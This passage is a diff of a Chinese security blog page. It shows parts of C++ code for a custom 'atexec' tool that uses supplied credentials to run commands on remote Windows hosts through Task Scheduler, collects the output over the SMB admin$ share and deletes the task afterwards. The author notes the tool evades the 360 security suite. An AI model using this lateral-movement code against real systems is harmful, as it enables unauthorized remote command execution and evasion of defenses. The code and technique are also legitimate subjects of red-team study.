 </span></span><span style=display:flex><span>	pExecAction<span style=color:#f92672>-&gt;</span>put_Arguments(_bstr_t(CommandArgs.data()));
 </span></span><span style=display:flex><span>
@@ -397,7 +409,7 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>		_variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(), <span style=color:#f92672>&amp;</span>pRegistredTask);
 </span></span><span style=display:flex><span>	Sleep(<span style=color:#ae81ff>10</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 结束时删除任务
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
+</span></span></span><span style=display:flex><span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
 </span></span><span style=display:flex><span>	pRootFolder<span style=color:#f92672>-&gt;</span>Release();
 </span></span><span style=display:flex><span>	pService<span style=color:#f92672>-&gt;</span>Release();
 </span></span><span style=display:flex><span>	CoUninitialize();
@@ -417,18 +429,18 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>==</span> <span style=color:#ae81ff>6</span>) {
 </span></span><span style=display:flex><span>		lpwDomain <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>5</span>]; <span style=color:#75715e>// 域名
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
+</span></span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	LPCWSTR wsCommand <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>4</span>]; <span style=color:#75715e>// 执行命令
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	LPCWSTR lpwsHost <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>1</span>]; <span style=color:#75715e>// 目标机器地址
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	LPCWSTR lpwsUserName <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>2</span>]; <span style=color:#75715e>// 账号
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	LPCWSTR lpwsPassword <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>3</span>]; <span style=color:#75715e>// 密码
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	std<span style=color:#f92672>::</span>wstring wsHostFile;
+</span></span></span><span style=display:flex><span>	LPCWSTR lpwsHost <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>1</span>]; <span style=color:#75715e>// 目标机器地址
+</span></span></span><span style=display:flex><span>	LPCWSTR lpwsUserName <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>2</span>]; <span style=color:#75715e>// 账号
+</span></span></span><span style=display:flex><span>	LPCWSTR lpwsPassword <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>3</span>]; <span style=color:#75715e>// 密码
+</span></span></span><span style=display:flex><span>	std<span style=color:#f92672>::</span>wstring wsHostFile;
 </span></span><span style=display:flex><span>	WCHAR wsOutPutPath[] <span style=color:#f92672>=</span> TEXT(<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>RunTime.log&#34;</span>);
 </span></span><span style=display:flex><span>	wsHostFile.append(TEXT(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>&#34;</span>));
 </span></span><span style=display:flex><span>	wsHostFile.append(lpwsHost);
 </span></span><span style=display:flex><span>	wsHostFile.append(TEXT(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>admin$</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>RunTime.log&#34;</span>));
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 连接任务计划
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	bRetVal <span style=color:#f92672>=</span> ConnectTaskServer(lpwsHost, NULL, lpwsUserName, lpwsPassword);
+</span></span></span><span style=display:flex><span>	bRetVal <span style=color:#f92672>=</span> ConnectTaskServer(lpwsHost, NULL, lpwsUserName, lpwsPassword);
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>bRetVal) {
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
 </span></span><span style=display:flex><span>	}
@@ -438,9 +450,9 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 连接目标服务器SMB
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (ConnectSMBServer(lpwsHost, lpwsUserName, lpwsPassword) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (ConnectSMBServer(lpwsHost, lpwsUserName, lpwsPassword) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
 </span></span><span style=display:flex><span>		<span style=color:#75715e>// 连接成功
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		GetSMBServerFileContent(wsHostFile.data());
+</span></span></span><span style=display:flex><span>		GetSMBServerFileContent(wsHostFile.data());
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span> {
 </span></span><span style=display:flex><span>		std<span style=color:#f92672>::</span>wcout <span style=color:#f92672>&lt;&lt;</span> TEXT(<span style=color:#e6db74>&#34;Can&#39;t Connect to &#34;</span>) <span style=color:#f92672>&lt;&lt;</span> lpwsHost <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
@@ -448,4 +460,4 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=0x05-其他atexec>0x05 其他Atexec</h2><p><strong><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py>impacket-atexec.py</a></strong> 是基于impacket库实现了MS-TSCH协议（只走445端口）来进行横向的脚本。</p><p>在我测试的过程中，Windows Server 2008上安装了360安全卫士后，横向无法取回结果，关闭360安全卫士后，成功执行，但我自己写的atexec就能够在360安全卫士开启的状态下完成命令执行、命令结果取回。</p><p><img src=https://images.payloads.online/a0652b0a-4f5f-11ec-9e17-00d861bf4abb.png alt=2020-06-28-22-04-33></p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2020-07-16/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>通过OXID解析器获取Windows远程主机上网卡地址</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2020-04-02/1/><span>如何实现一个Psexec</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
+</span></span></code></pre></div><h2 id=0x05-其他atexec>0x05 其他Atexec</h2><p><strong><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py>impacket-atexec.py</a></strong> 是基于impacket库实现了MS-TSCH协议（只走445端口）来进行横向的脚本。</p><p>在我测试的过程中，Windows Server 2008上安装了360安全卫士后，横向无法取回结果，关闭360安全卫士后，成功执行，但我自己写的atexec就能够在360安全卫士开启的状态下完成命令执行、命令结果取回。</p><p><a href=https://images.payloads.online/a0652b0a-4f5f-11ec-9e17-00d861bf4abb.png data-fancybox=gallery data-caption=2020-06-28-22-04-33><img src=https://images.payloads.online/a0652b0a-4f5f-11ec-9e17-00d861bf4abb.png alt=2020-06-28-22-04-33></a></p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2020-07-16/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>通过OXID解析器获取Windows远程主机上网卡地址</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2020-04-02/1/><span>如何实现一个Psexec</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><script src=/js/fancybox.umd.js></script><script>Fancybox.bind('[data-fancybox="gallery"]',{})</script><script src=/js/pangu.min.js></script><script>document.addEventListener("DOMContentLoaded",()=>{pangu.spacingElementByClassName("prose")})</script><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
